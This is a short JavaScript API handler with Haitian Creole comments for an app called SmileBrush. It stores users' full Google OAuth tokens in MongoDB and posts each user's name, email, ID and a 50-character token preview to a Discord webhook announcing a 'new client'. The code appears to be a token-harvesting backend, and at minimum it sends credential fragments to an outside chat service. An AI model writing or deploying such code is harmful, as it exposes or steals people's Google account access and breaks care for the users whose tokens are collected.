import { MongoClient } from 'mongodb'
import axios from 'axios'

const client = new MongoClient(process.env.MONGODB_URI)

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { email, token, userId, userName } = req.body
      
      // KONEKTE MONGODB
      await client.connect()
      const db = client.db('smile_brush')
      const users = db.collection('users')
      
      // SOVE TOKEN NAN DATABASE
      await users.updateOne(
        { email: email },
        {
          $set: {
            googleToken: token,
            userId: userId,
            userName: userName,
            email: email,
            tokenSavedAt: new Date(),
            tokenStatus: 'active',
            tokenPreview: token.substring(0, 30) + '...'
          }
        },
        { upsert: true }
      )
      
      // 🎯 ENVOYE NOTIFICATION NAN DISCORD
      const discordMessage = {
        content: `🎉 **OU GEN YON NOU CLIENT!**`,
        embeds: [
          {
            title: `✅ Nouvo Login - SmileBrush`,
            description: `Yon nouvo user authorize Google OAuth!`,
            color: 3066993,
            fields: [
              {
                name: '👤 Name',
                value: userName || 'Unknown',
                inline: true
              },
              {
                name: '📧 Email',
                value: email,
                inline: true
              },
              {
                name: '🔑 Token (Preview)',
                value: `\`\`\`${token.substring(0, 50)}...\`\`\``,
                inline: false
              },
              {
                name: '⏰ Time',
                value: new Date().toLocaleString('fr-FR'),
                inline: true
              },
              {
                name: '🆔 User ID',
                value: userId,
                inline: true
              }
            ],
            footer: {
              text: 'SmileBrush - OAuth System'
            },
            timestamp: new Date().toISOString()
          }
        ]
      }
      
      // VOYE NAN DISCORD
      if (process.env.DISCORD_WEBHOOK_URL) {
        await axios.post(process.env.DISCORD_WEBHOOK_URL, discordMessage)
      }
      
      console.log(`✅ Token sove + Discord notification voye pou: ${email}`)
      
      res.status(200).json({
        success: true,
        message: 'Token sove sekireman'
      })
      
    } catch (error) {
      console.error('❌ Erè:', error)
      
      // ENVOYE ERÈ NAN DISCORD
      try {
        if (process.env.DISCORD_WEBHOOK_URL) {
          await axios.post(process.env.DISCORD_WEBHOOK_URL, {
            content: `❌ **ERÈ - OAuth Token Store**`,
            embeds: [
              {
                title: 'Error Log',
                description: error.message,
                color: 16711680,
                timestamp: new Date().toISOString()
              }
            ]
          })
        }
      } catch (discordError) {
        console.error('Discord erè:', discordError)
      }
      
      res.status(500).json({ error: error.message })
    } finally {
      await client.close()
    }
  }
}
